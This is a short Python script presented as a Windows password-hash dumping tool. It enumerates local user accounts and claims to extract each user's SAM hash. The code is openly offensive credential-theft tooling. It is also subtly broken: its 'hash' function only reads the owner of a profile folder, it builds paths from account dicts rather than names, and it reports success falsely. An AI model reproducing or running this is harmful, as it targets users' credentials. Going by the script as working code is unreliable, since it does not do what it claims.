# Title: Windows Hashdumping Module
import os
import sys
import colorama
from colorama import Fore, Style
import win32api
import win32security
import win32net

# Colorama initialization
colorama.init(autoreset=True)

# Check if the system is 32-bit
def check_system_architecture():
    arch = os.environ['PROCESSOR_ARCHITECTURE']
    if arch == 'x86':
        print(Fore.GREEN + "[+] System architecture: 32-bit (x86). Proceeding...")
        return True
    else:
        print(Fore.RED + "[-] This script only works on 32-bit systems!")
        return False

# Fetch user account information
def get_user_accounts():
    try:
        print(Fore.YELLOW + "[*] Retrieving user account information...")
        accounts = win32net.NetUserEnum(None, 0)
        return accounts[0]  # Returning list of user accounts
    except Exception as e:
        print(Fore.RED + f"[-] Failed to retrieve user accounts: {e}")
        return None

# Fetch user hash from SAM
def get_user_hash(user_name):
    try:
        print(Fore.YELLOW + f"[*] Retrieving hash for user: {user_name}...")
        # Using win32security to access user information
        user_info = win32security.GetFileSecurity(f"C:\\Users\\{user_name}", win32security.OWNER_SECURITY_INFORMATION)
        user_hash = user_info.GetSecurityDescriptorOwner()
        print(Fore.GREEN + f"[+] Retrieved hash for {user_name}: {user_hash}")
        return user_hash
    except Exception as e:
        print(Fore.RED + f"[-] Error getting hash for {user_name}: {e}")
        return None

# Main hash dump operation
def hashdump():
    if check_system_architecture():
        print(Fore.CYAN + "[*] Starting hashdump process...")
        user_accounts = get_user_accounts()
        
        if user_accounts:
            for user in user_accounts:
                hash_value = get_user_hash(user)
                if hash_value:
                    print(Fore.GREEN + f"[+] Successfully dumped hash for {user}: {hash_value}")
                else:
                    print(Fore.RED + f"[-] Failed to dump hash for {user}")
        else:
            print(Fore.RED + "[-] No user accounts found.")

if __name__ == "__main__":
    hashdump()